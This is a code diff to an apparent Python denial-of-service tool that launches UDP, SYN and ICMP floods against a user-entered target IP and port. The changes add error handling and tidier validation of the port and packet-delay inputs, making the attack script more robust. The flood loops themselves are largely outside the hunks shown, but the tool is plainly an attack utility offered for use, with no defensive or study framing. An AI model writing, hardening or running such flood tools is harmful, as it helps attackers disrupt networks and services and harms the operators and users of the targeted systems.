@@ -84,6 +84,8 @@ def udp_flood(target_ip, target_port, message, delay):
                 time.sleep(delay)
     except KeyboardInterrupt:
         print("\n[!] Stopping UDP flood attack.")
+    except Exception as e:
+        print(f"[-] Error during UDP flood attack: {e}")
 
 def syn_flood(target_ip, target_port, delay):
     print(f"[*] Starting SYN flood attack on {target_ip}:{target_port}...")
@@ -99,6 +101,8 @@ def syn_flood(target_ip, target_port, delay):
                 time.sleep(delay)
     except KeyboardInterrupt:
         print("\n[!] Stopping SYN flood attack.")
+    except Exception as e:
+        print(f"[-] Error during SYN flood attack: {e}")
 
 def icmp_flood(target_ip, delay):
     print(f"[*] Starting ICMP (ping) flood attack on {target_ip}...")
@@ -112,18 +116,26 @@ def icmp_flood(target_ip, delay):
             time.sleep(delay)
     except KeyboardInterrupt:
         print("\n[!] Stopping ICMP flood attack.")
+    except Exception as e:
+        print(f"[-] Error during ICMP flood attack: {e}")
 
 def main():
     # User input
     target_ip = input("Enter the target IP address: ").strip()
-    target_port = int(input("Enter the target port (1-65535): ").strip())
+    try:
+        target_port = int(input("Enter the target port (1-65535): ").strip())
+        if not (1 <= target_port <= 65535):
+            raise ValueError("Invalid port number.")
+    except ValueError as e:
+        print(f"[-] {e}")
+        return
+
     attack_type = input("Choose attack type (1: UDP flood, 2: SYN flood, 3: ICMP flood): ").strip()
     custom_message = input("Enter the message to send (default: 'TEST_PACKET'): ").strip() or "TEST_PACKET"
-    packet_delay = float(input("Enter delay between packets in seconds (default: 0.1): ").strip() or 0.1)
-
-    # Input validation
-    if not (1 <= target_port <= 65535):
-        print("[-] Invalid port number. Please choose a port between 1 and 65535.")
+    try:
+        packet_delay = float(input("Enter delay between packets in seconds (default: 0.1): ").strip() or 0.1)
+    except ValueError:
+        print("[-] Invalid delay value. Please enter a valid number.")
         return
 
     # Detect platform
